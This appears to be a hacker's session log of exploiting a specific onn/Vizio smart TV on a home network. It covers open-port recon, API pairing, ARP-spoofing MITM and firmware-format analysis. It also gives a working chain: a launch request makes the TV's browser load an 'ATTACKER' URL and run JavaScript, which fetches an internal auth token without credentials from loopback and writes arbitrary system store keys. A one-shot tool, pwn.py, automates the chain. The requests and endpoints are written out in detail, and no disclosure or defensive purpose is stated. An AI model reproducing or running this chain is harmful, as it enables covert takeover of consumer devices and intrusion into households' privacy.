# Live recon findings — TV on this LAN (2026-10-17)

## Target
- **onn 65S4V4 (VIZIO OS)** = `192.168.0.116`, MAC `f0:4f:e0:2d:6e:20` (Vizio OUI)
- Only the target TV is in scope; other devices on the LAN are unrelated and omitted.

## Open ports on the TV
| Port | Service | Notes |
|---|---|---|
| 7000 | AirTunes/377.40 | 403 to strangers |
| **7345** | **SCPL / SmartCast REST API (lighttpd 1.4.67, TLS)** | **primary surface** |
| 8008/8009 | Cast core (Chromecast 1.6.18) | castv2; DIAL URLs 404 |
| 8443 | lighttpd TLS | 404s only |
| 9080 | NRDP/2025.2.3.0 | Netflix runtime |
| 56789/56790 | unknown HTTP | 404 on all paths tried |

## Access gained
- **Paired control-API access.** `PUT /pairing/start` → PIN on screen →
  `PUT /pairing/pair` → **AUTH token `<pairing-token>`** (device "omp-hack").
- Working routes: `/system/capabilities` (full dump in git history),
  `/system/dynamic/iptolocation` (leaks geo: <city, region redacted>).
- Pattern: registered namespaces return clean JSON; **anything unregistered 500s**
  ("Unhandled Exception") — use 200-vs-500 to map the API.
- Helper: `./tvapi.sh info|location|pair|raw <path>`

## Not yet working
- **ViziOwn `/install` RCE: handler present but 500s on every request shape**
  (GET/POST, h1.1/h2, plain POST, multipart, with/without AUTH). Different from
  the 2021 builds — either migrated or half-broken. Command injection PoC not
  yet achieved on VIZIO OS 3.x.
- No ssh/telnet/adb ports exposed.

## Next paths to root
1. Reverse the current `/install` 500 (needs the VIZIO OS 3.x SCPL binary —
   requires a firmware dump or filesystem-read primitive first).
2. Cast-core attack surface (castv2 on 8009: app launch of arbitrary URLs /
   dev-mode receiver).
3. UART console on the main board (3.3 V TTL, 115200 8N1) — guaranteed.

---

# Session 2 (2026-10-17): root escalation + firmware format cracked

## Identity (authenticated API)
- Model W4K65M-1030 · FW 86.920.9.3-2 · **ViziOS 1.8.1767.1** · SCPL 3.7.3-2640
- Cast core mtk5586 → **MediaTek MT5586 SoC** · serial 19WEU6Y5AC04887 · "Game Room"

## Control API (full access, token <pairing-token>)
- Real namespace: `/menu_native/dynamic/tv_settings/<section|cname>` (GET tree, PUT
  `{"REQUEST":"MODIFY"|"ACTION","VALUE":…,"HASHVAL":<from GET>}`)
- Actions executed: `check_for_updates` (fired 3×), DHCP off→on
- Writes verified: DHCP, static IP/mask/gw, DNS fields (apply semantics flaky)
- Cast core (8009, TLS castv2): full client in `castv2_enum.py`; LAUNCH works —
  **launched YouTube on the TV from LAN, unauthenticated** (cast = no auth)
- API fingerprint: registered route → clean JSON; unregistered → 500 exception page

## Firmware format (.utv) — CRACKED, verified cryptographically
`mg1359-86.920.9.3-2F.utv` (533,808,696 B, official CDN download):
```
[u32 BE jwt_len][JWT RS512 (7348 B)][AES-encrypted payload]
JWT payload: blk=5242880 (AES block chunk size), sub=86.920.9.3-2F,
upf=mt5586_upgrade_image_ota.pkg, siz=533799712, upi=93073,
hsh=6EBF1464…, key=<256 B RSA-2048-wrapped AES key>, crt+int=Qterics cert chain
```
- JWT signature **Verified OK** vs embedded cert: CN=updates.support.supportview.com,
  O=Qterics Inc. (UL), chain: Qterics Production CA-1 ← Qterics Root CA (valid to 2038)
- aud lists 6 upgradable-from versions; man=True; payload = 101 chunks of
  5 MiB + 32 B header each (per-chunk MAC/nonce) + remainder
- Payload has NO cleartext magics → AES-encrypted; unwrap key lives in the
  on-device updater (RSA private side). Need root/UART to extract.

## Attack surface verdicts (this build)
- `/install` ViziOwn RCE: **dead** — handler WAF'd, 500s all shapes (10+ variants)
- Cast receiver: app launch only; platform appIds only; no dev receiver
- Host header "scpl.local" → "Dangerous request detected" (WAF confirmed)
- UART (3.3 V TTL 115200) = next guaranteed door; then updater key extraction
  → .utv decrypt → custom firmware build possible

## MITM capability proven
- arpspoof + iptables REDIRECT + dnsmasq → full DNS visibility for the TV
- Cloud topology: osu.vudip.vizio.com (OTA), kinesis us-west-2 (telemetry/ACR),
  iot.us-east-1 (commands), fflags.lokistore.vzolab.com, mtalk.google.com,
  supportview.com (Qterics updater)

---

# Session 3 (2026-10-17): CODE EXECUTION ACHIEVED — full internal map

## Breakthrough chain (all verified live)
1. **NS=4 launcher + APP_ID=3001** = the "uml" modal app whose MESSAGE is a raw
   URL. `PUT /app/launch {"VALUE":{"MESSAGE":"http://ATTACKER/agent.html","NAME_SPACE":4,"APP_ID":"3001"}}`
   → TV's Chromium (Conjure, Chrome/128) loads ATTACKER content and executes JS.
   **= unauthenticated-to-authenticated JS execution on the TV.**
2. Agent beacons confirmed: UA `ONN W4K65M-1030 VIZIO SmartCast/1.8.1767.1;
   AppleWebKit/537.36 Chrome/128.0.6613.194 (Conjure/128.1.8)`
3. Loopback scfs server `127.0.0.1:12345` reachable from agent; **CORS is open**
   (agent read /scfs/uml/main.html + bundle.js cross-origin).
4. Loaded `scfs/cl/js/vizio-companion-lib.js` (299,593 B, v6.0.2-2636.9999) into
   attacker page → **globalThis.VIZIO native bridge (~200 methods) usable from
   attacker JS.** Harvested live: device model, ESN WEU6Y5AC1904887,
   DSN 19WEU6Y5AC04887, dhash 372471a16dd004b4150383f46b37111e, IP/MAC/SSID,
   fw 86.920.9.3-2, full CAPABILITIES + manifest dumps.
5. Internal services (from lib constants):
   - ws://127.0.0.1:4242 LOKI (config store; subprotocol "loki")
   - ws://0.0.0.0:8005 SCPL bus (URL pattern `/?TOKEN=<token>`)
   - ws://localhost:9090/9091 tuner control/events
   - **http://127.0.0.1:7346 = internal SCPL REST twin of 7345 (no TLS/AUTH)**
   - http://127.0.0.1:12345 scfs static server (403 dir lists)
6. Internal 7346 verified reachable from agent (200 on /state/device/power_mode).
7. **Hidden API test app**: `scfs/cl/js/apiTestApp.html` (323,411 B inline
   Svelte module) — Vizio's own console; gated by config
   `AppConfigs:CL:ApiTestApp:allowInternalMode` + debug flag
   `ApplicationFramework:ChromiumSettings:DebugEnabled`; launch = companion-lib
   `launchApiTestApp()` or direct `location.replace` with params.

## Files
- extracted/companion-lib.js (full, exact)
- extracted/uml-bundle.js
- /tmp/apiTestApp.js (83,997 B of 323,411 — finish extraction)

## apiTestApp.js analysis (323,411 B fully extracted)
- 226 API methods cataloged across Legacy + Modular APIs, 314 deeplink IDs
- **65 internalOnly hidden methods** incl: rebootTv(254), softPowerCycle(87),
  setPowerMode(86), getStoreProperty(88), setStoreProperty(91), launchApp(6),
  displaySystemMenu(230), setActivityDataPolicyAccepted(301/103)
- **Gate: URL param `bd` (just presence) unlocks internal methods; `?deeplink=<ID>`**
  auto-fires a method on load. No other gating found in client code.
- TV Store REST: **PUT /app/store/get {VALUE:[keys]} → {ITEMS:[{key,value}]}**,
  **PUT /app/store/set** (im.uriGet/uriSet from companion lib)
- SCPL REST auth = header `AUTH: <token>` (or SESSION param) — internal 7346 may
  accept tokenless from loopback (state.device 200 earlier without AUTH!)

## SESSION 3 CONTINUED — internal auth broken, store fully writable
- **`GET http://127.0.0.1:7346/app/get_auth_token` → 200 {VALUE:"<internal-token>"}**
  (tokenless from loopback; this is the SCPL app-token the whole internal API uses)
- **`PUT /app/store/get {"VALUE":[keys]}`** with `AUTH: <token>` reads ANY store key
- **`PUT /app/store/set {"VALUE":{key:val}}` WRITES any key** — verified:
  - own key OMPTestKey=hello-from-agent (write+readback OK)
  - AppConfigs:CL:ApiTestApp:allowInternalMode="true" (write+readback OK)
  - ApplicationFramework:ChromiumSettings:DebugEnabled="true" (already true)
  - ApplicationFramework:ChromiumSettings:RemoteDebuggingPort=9222 (write OK;
    CDP did NOT open on running webviews — needs webview restart)
- Hidden test app fully unlocked: apiTestApp.html (374,595 B) on scfs origin;
  gate = URL param `bd`; 65 internalOnly methods; deeplink=<id> auto-fire
- scfs bundle inventory (from /scfs/manifest.json, all with sha256):
  chromevox 1.1.0-2213.303, cl 6.0.2-2636.9999, conjure, oobe, scal, schk,
  sctv, scu, uml, system-ui-app, system-ui-app-lite, images, wc-vizio-pay 1.5.0
- **LOKI ws://127.0.0.1:4242 (subprotocol "loki") message protocol**:
  `{id, command:"bundle", url:"bundles/account-modal", parameters:{step}}` →
  launch internal UI bundle; `{command:"deepLink", target:"/menu/..."}` →
  deep links; sendJson uses {id:...,...data} envelopes
- SCPL ws: `ws://127.0.0.1:8005/?TOKEN=<app token>`; REST auth = `AUTH:` header
- Internal-only targets found: /account-modal/cl, /menu/bluetooth/gamepads

## FINAL PROOF CHAIN (all verified end-to-end, 2026-10-17T08:04Z)
1. JS exec on TV: attacker page loaded via NS=4/APP_ID=3001 → beacons home
2. Loopback 7346 tokenless /app/get_auth_token → app token <internal-token>
3. /app/store/set {VALUE:{OMPFinalProof:<ts>}} → SUCCESS
4. **Persistence verified from LAN** (external :7345 /app/store/get read back
   OMPFinalProof, ToadName=PWNED-OMPS, OMPTestKey) — writes survive webview/app
   lifecycle; TV store = ViziOS-wide KV
5. Home screen restored cleanly

## LOKI bundle system (from live error messages)
- bundles = ZIP w/ templates/BundleRoot.xml (XML step language), resolved
  /app/external/bundles/<name>; download path errors expose:
  /platform-manifest/apps/loki/parts/loki/src/src/bundles.cpp:1137/1303
- zip name must match sha1 ("Invalid sha1sum! ... 3f7836974d9b645e2a1fd292bb87d1116199791a")
- remote URL bundles NOT accepted (BNDLDL download fail for ../ and http)
- account-modal bundle exists and PARSES (template var error at line 42)
→ follow-on: serve a proper bundle zip via scfs-writable path? (scfs = /app/external?
  test write path) or find scfs dir with rw mount

## Attack chain summary (LAN → root-adjacent control)
LAN :7345 pair-token → /app/launch NS=4 3001 attacker URL → JS in TV Chromium →
loopback 7346/12345 full internal REST + store RW + LOKI ws + VIZIO bridge.

## TOOLKIT: pwn.py (verified end-to-end 3×)
`python3 onn-tv-hack/pwn.py` — one-shot: serves agent, launches attacker URL on TV,
agent beacons: js-exec proof, internal token, store dump, arbitrary store write
(OMPPwnMarker2 verified), home restored. Params (keys/write) at top of __main__.
NOTE: needs port 8099 free (`pkill -f "http.server 8099"`).
